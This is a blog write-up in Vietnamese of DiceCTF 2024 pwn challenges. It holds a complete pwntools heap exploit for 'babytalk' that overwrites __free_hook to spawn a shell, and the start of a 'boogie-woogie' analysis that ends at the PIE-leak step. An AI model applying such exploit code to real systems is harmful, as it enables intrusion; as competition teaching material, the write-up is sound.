<!DOCTYPE html>
<html class="" lang="en-us"><head>
    
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=7" />

    <link
    rel="icon"
    href='/favicon.png'
/>
<link
    rel="shortcut icon"
    href='/favicon.ico'
    type="image/x-icon"
/>
<link
    rel="apple-touch-icon"
    href='/apple-touch-icon.png'
/>

    <link
        rel="icon"
        href='/logo.svg'
        type="image/svg+xml"
    />

<title>
        
            DICE-CTF 2024 Writeups  &ndash;
        
        w1n-gl0ry&#39;s
    </title>

    
    <link href="/symbols-nerd-font/symbols-nerd-font.css" rel="stylesheet" integrity="sha512-lydow8GLOLlYNOtHlksNCmGWWCBsbIEtikXpHzfWqx78HLlyQZHOzyLwPpKol4Th6aCwLUXOfODVYgwrd3nwKQ=="/>
    <link href="/jetbrains-mono/jetbrains-mono.css" rel="stylesheet" integrity="sha512-tJxlgL6v1Y7kFf+qB8SloaAMKnOAw6WouknxXtIjkBux9Y/9aX81EUWOJO8c/3l98DmjG8brr4to7zaez606Fg=="/>

    
    
    <link type="text/css" rel="stylesheet" href=https://w1n-gl0ry.github.io/css/styles.abbd6311bb4b6ca58f8e7398140529245ae0f6428b759fcd830742eee2619eabb900ba9914a9affb82aa9a16a9b9ea727bb315315a976a0db0e7513a5f12c504.css integrity="sha512-q71jEbtLbKWPjnOYFAUpJFrg9kKLdZ/NgwdC7uJhnqu5ALqZFKmv&#43;4Kqmhapuepye7MVMVqXag2w51E6XxLFBA==" />
<meta name="author" content="botton" />

    
        <meta name="keywords" content='ctf, pwn' />
    
    
        <meta name="description" content="DICE-CTF 2024 Quals Writeups" />
    

<meta property="og:site_name"
    content='w1n-gl0ry&#39;s' />

    <meta property="og:title" content="DICE-CTF 2024 Writeups" />
    <meta property="og:type" content="article" />
    
    <meta
        property="article:author" content="botton" />
    <meta
        property="article:published_time"
        content='2024-02-02T17:37:11Z&#43;0800' />
    
        
            <meta property="article:tag" content="ctf" />
        
            <meta property="article:tag" content="pwn" />
        
    
    <meta property="og:url" content="https://w1n-gl0ry.github.io/posts/dice_ctf_2024/" />
    
    
    <meta property="og:image"
        content="https://w1n-gl0ry.github.io/icon512.png" />
    
        <meta property="og:description" content="DICE-CTF 2024 Quals Writeups" />
    

<meta name="twitter:card" content="summary_large_image" />
<meta property="twitter:domain"
      content='w1n-gl0ry.github.io'
/>
<meta property="twitter:url" content="https://w1n-gl0ry.github.io/posts/dice_ctf_2024/" />


    <meta name="twitter:title" content="DICE-CTF 2024 Writeups" />
    
    
    
    <meta name="twitter:image"
        content="https://w1n-gl0ry.github.io/icon512.png" />
    
        <meta name="twitter:description" content="DICE-CTF 2024 Quals Writeups" />
    

<link rel="manifest" href="/manifest/index.json" />
</head>


<body>
        <div id="baseContainer"><header class="">
<div class="titleAndSearchContainer">
        <div id="titleContainer">
            
                <a class="unstyledLink" href="/">
                    <img src='/logo.svg' alt='Logo'/>
                </a>
            
            <div class="rightOfLogo">
                <div class="titleAndHamburger">
                    <h1>
                        <a class="unstyledLink" href="/">w1n-gl0ry&#39;s</a>
                        
                    </h1>
                    
                </div>
                <div id="wide_nav"><nav>
    
    <ul id="main-nav">
        <li><a href="/">Home</a></li>
        
            <li><a href="/posts/">Posts</a></li>
        
        
        
        
        
        
            <li><a href="https://w1n-gl0ry.github.io/about/about/">About</a></li>
        
        
            <li><a href="/tags/">Tags</a></li>
        
        
    </ul>
</nav>
</div>
            </div>
        </div>
        <div class="search">
    <input id="searchbar" type="text" placeholder='Search' />
    <span class="nerdlink" onclick="newSearch();">&#xf002;</span>
</div>
<script>
    function newSearch() {
        let term = searchbar.value.trim();
        if (!term) return;
        location.href = `/search/?q=${term}`;
    }
    searchbar.onkeyup = (ev) => {if (ev.keyCode == 13) newSearch()};
</script>

    </div>
    <div id="links">
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="/index.xml">
    
    
        &#xf09e;
    
    <span>
        RSS
    </span>
</a>

        
        <a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://github.com/w1n-gl0ry">
    
    
        &#xf09b;
    
    <span>
        GitHab
    </span>
</a>
<a
    
        rel="noreferrer"
    
    target="_blank"
    class="nerdlink"
    href="https://twitter.com/botton3310">
    
    
        &#xf099;
    
    <span>
        Titter
    </span>
</a>

    </div>
    

</header>
<div id="contentContainer">
                <div id="content">
                    <main>
<article class="card single">
    
        <h1>DICE-CTF 2024 Writeups</h1>
    
    
        <p class="date">
            <span title='Date'> </span>
    2024-02-02

</p>
    
    
    
    <div class="articleToc">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#lời-nói-đầu">Lời nói đầu</a></li>
    <li><a href="#pwn---babytalk">Pwn - babytalk</a>
      <ul>
        <li><a href="#source-code-overview">Source code overview</a></li>
        <li><a href="#solution">Solution</a></li>
        <li><a href="#solve-script">Solve Script</a></li>
      </ul>
    </li>
    <li><a href="#pwn---boogie-woogie">Pwn - boogie-woogie</a>
      <ul>
        <li><a href="#source-code-overview-1">Source code overview</a></li>
        <li><a href="#solution-1">Solution</a>
          <ul>
            <li><a href="#leak-pie">Leak PIE</a></li>
            <li><a href="#leak-heap">Leak HEAP</a></li>
            <li><a href="#leak-libc">Leak LIBC</a></li>
            <li><a href="#get-shell">Get SHELL</a></li>
          </ul>
        </li>
        <li><a href="#solve-script-1">Solve Script</a></li>
      </ul>
    </li>
    <li><a href="#mics---zshfuck">Mics - zshfuck</a>
      <ul>
        <li><a href="#source-code-overview-2">Source code overview</a></li>
        <li><a href="#solution-2">Solution</a></li>
        <li><a href="#final-payload">Final Payload</a></li>
      </ul>
    </li>
    <li><a href="#reference">Reference</a></li>
  </ul>
</nav>
    <hr />
</div>

    <div><h1 id="lời-nói-đầu">Lời nói đầu</h1>
<p>Trải qua 1 năm khá dài dẳng với CTF, mình quyết định kết thúc năm 2023 này với giải DiceCTF. Sau đây là writeups của 1 số bài mình làm được trong suốt và cả sau giải.</p>
<h1 id="pwn---babytalk">Pwn - babytalk</h1>
<h2 id="source-code-overview">Source code overview</h2>
<ul>
<li>Đây là bài đầu tiên mình làm trong giải, và có vẻ là 1 challenge về Heap khá dễ thở.</li>
<li>Challenge dưới dạng tệp ELF 64-bit, full-mitigations, có 4 chức năng</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╭─</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>baby<span style="color:#f92672">-</span>talk <span style="color:#960050;background-color:#1e0010"></span>                                                                                                             <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010">✔</span> <span style="color:#960050;background-color:#1e0010"></span> w1n_gl0ry<span style="color:#960050;background-color:#1e0010">@</span>phis1Ng <span style="color:#960050;background-color:#1e0010">─╮</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─</span> .<span style="color:#f92672">/</span>chall_patched                                                                                                                                                                  <span style="color:#960050;background-color:#1e0010">─╯</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1.</span> str
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2.</span> tok
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3.</span> del
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4.</span> exit
</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> 
</span></span></code></pre></div><p>Thoạt nhìn qua 3 chức năng <code>do_str</code>, <code>do_tok</code>, <code>do_del</code> thì không thấy bug gì cả. Chúng ta có thể allocate qua malloc, strtok, free.</p>
<h2 id="solution">Solution</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">do_tok</span>(<span style="color:#66d9ef">void</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;idx? &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_num</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (idx <span style="color:#f92672">&gt;=</span> ARR_SIZE) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;too big!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>str <span style="color:#f92672">=</span> strs[idx];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (str <span style="color:#f92672">==</span> NULL) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;empty!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;delim? &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> delim[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">read</span>(STDIN_FILENO, delim, <span style="color:#66d9ef">sizeof</span>(delim));
</span></span><span style="display:flex;"><span>    delim[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\0&#39;</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>tok <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtok</span>(str, delim); tok <span style="color:#f92672">!=</span> NULL; tok <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtok</span>(NULL, delim)) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(tok);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Hàm <code>strtok()</code> chia 1 string thành chuỗi NULL hoặc là 1 chuỗi token. Nếu tìm thấy delimiter byte đã được chỉ định, nó sẽ được ghi đè bởi NULL byte để kết thúc chuỗi.</p>
<p><code>The strtok() function breaks a string into a sequence of zero or more nonempty tokens.  On the first call to strtok(), the string to be parsed should be specified in str.  In each subsequent call that should parse the same string, str must be NULL.</code></p>
<p>Ở hàm <code>do_str()</code>, khi cấp phát và nhập nội dung thì nó sẽ đọc chính xác số kí tự theo size đã được chỉ định và không kết thúc chuỗi bằng NULL byte.
Do đó, ta có thể lấp đầy heap.</p>
<p><img src="image.png" alt="alt text"></p>
<p>Bây giờ ta gọi hàm <code>do_tok()</code> và chỉ định delimiter byte là byte đầu tiên của trường size của chunk kế tiếp, ta sẽ trigger được null byte overflow.</p>
<p><img src="https://imgur.com/S1RcWyr" alt="alt text"></p>
<p>Đến đây, mình khá là tà đạo nên sẽ sử dụng kĩ thuật House of einherjar để ghi đè <code>__free_hook</code> và get shell.</p>
<h2 id="solve-script">Solve Script</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>process(<span style="color:#e6db74">&#39;./chall_patched&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        init-pwndbg
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>: 
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">=</span>remote(<span style="color:#e6db74">&#39;mc.ax&#39;</span>, <span style="color:#ae81ff">32526</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#io=remote(&#39;0&#39;, 1337)</span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./libc-2.27.so&#39;</span>)
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">=</span>ELF(<span style="color:#e6db74">&#39;./chall_patched&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">str_</span>(size, ll):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;size? &#39;</span>, str(size)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> size:
</span></span><span style="display:flex;"><span>        sleep(<span style="color:#ae81ff">0.1</span>)
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>send(ll)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">tok</span>(idx, delim):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;idx? &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;delim? &#39;</span>, delim)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">del_</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;idx? &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exit_</span>():
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">2</span>):
</span></span><span style="display:flex;"><span>    str_(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aa&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)
</span></span><span style="display:flex;"><span>tok(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>heap <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">-</span>  <span style="color:#ae81ff">0x260</span>
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>print(hex(heap))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x4f8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x20</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>)
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x4f8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x60</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>tok(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0\0</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x3ebc60</span>
</span></span><span style="display:flex;"><span>print(hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span><span style="color:#75715e"># del_(0)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x38</span>, p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x60</span>)<span style="color:#f92672">+</span>p64(heap<span style="color:#f92672">+</span><span style="color:#ae81ff">0x7d0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>) <span style="color:#75715e"># 2</span>
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x28</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x28</span>) <span style="color:#75715e"># 3</span>
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0xf8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;B&#39;</span>) <span style="color:#75715e"># 4</span>
</span></span><span style="display:flex;"><span>tok(<span style="color:#ae81ff">3</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x01</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x28</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x60</span>)) <span style="color:#75715e"># 3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
</span></span><span style="display:flex;"><span>    str_(<span style="color:#ae81ff">0xf8</span>, str(i)<span style="color:#f92672">.</span>encode()) <span style="color:#75715e"># 5 -&gt; 12</span>
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x68</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;C&#39;</span>) <span style="color:#75715e"># 13</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">7</span>):
</span></span><span style="display:flex;"><span>    del_(i<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">4</span>) 
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x158</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;test&#39;</span>) 
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">3</span>)
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x158</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;test&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">10</span><span style="color:#f92672">+</span>p64(<span style="color:#ae81ff">0x30</span>)<span style="color:#f92672">+</span>p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>__free_hook)) 
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x28</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>) 
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x28</span>, p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system))  
</span></span><span style="display:flex;"><span>str_(<span style="color:#ae81ff">0x100</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/sh&#39;</span>)
</span></span><span style="display:flex;"><span>del_(<span style="color:#ae81ff">6</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="pwn---boogie-woogie">Pwn - boogie-woogie</h1>
<h2 id="source-code-overview-1">Source code overview</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stddef.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdbool.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;dlfcn.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// generate art.h with echo &#34;const unsigned char __art[] = {$((ascii-image-converter ./aoi-todo.webp  --color --dither --braille --width 80; echo -ne &#34;\x00&#34;) | xxd -i)};&#34; &gt; art.h
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;art.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">char</span> data[] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;Listen closely, cursed spirit. There is no way you do not know this. An arm is</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">merely a decoration. The act of applause is an acclamation of the soul!&#34;</span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">clap</span>(<span style="color:#66d9ef">size_t</span> a, <span style="color:#66d9ef">size_t</span> b)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    data[a] <span style="color:#f92672">^=</span> data[b];
</span></span><span style="display:flex;"><span>    data[b] <span style="color:#f92672">^=</span> data[a];
</span></span><span style="display:flex;"><span>    data[a] <span style="color:#f92672">^=</span> data[b];
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// gcc main.c -o boogie-woogie
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// set line buffering. comment this to let libc decide when to buffer (based on pty)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// setvbuf(dlsym(NULL, &#34;stdout&#34;), NULL, _IOLBF, 0);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, __art);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0;33mEven this cursed spirit uses Black Flash. The one who is now being left behind</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">is me. You’ve gotten strong, brother. Are you gonna just sit still, </span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[4;33mAoi Todo</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0;33m?!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Are you gonna let your brother feel alone again, </span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[4;33mAoi Todo</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0;33m?!</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (data[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">size_t</span> a, b <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\x1b</span><span style="color:#e6db74">[31;49;1;4m%s</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m</span><span style="color:#ae81ff">\n\n\n</span><span style="color:#e6db74">&#34;</span>, data);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;The sound of </span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0;33mgion shoja bells</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m echoes the impermanence of all things. The color</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">of </span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0;33msala flowers</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m reveals the truth that the prosperous must decline. </span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[4;33mHowever</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m! We</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">are the exception:</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%zu %zu&#34;</span>, <span style="color:#f92672">&amp;</span>a, <span style="color:#f92672">&amp;</span>b);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">clap</span>(a, b);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Chương trình nhìn có vẻ đơn giản, nhận 2 số làm input, swap 2 kí tự ở mảng toàn cục <code>data</code> và sẽ in ra mảng đó sau khi swap.</p>
<p>Không có đoạn code nào check input của ta nên dễ thấy OOB xuất hiện và từ đó có thể swap byte với mọi phân vùng <code>rw*</code> trong binary.</p>
<h2 id="solution-1">Solution</h2>
<h3 id="leak-pie">Leak PIE</h3>
<p><a href="https://wiki.osdev.org/C%2B%2B#GCC">__dso_handle</a> ?</p>
<p>Nó được đưa vào tham số thứ 3 của hàm <code>__cxa_atexit</code> và được dùng để xác định dynamic shared objects trong quá trình hủy đối tượng toàn cục (thông thường là ở quá trình kết thúc chương trình)</p>
<p><code>int __cxa_atexit(void (*destructor) (void *), void *arg, void *__dso_handle);</code></p>
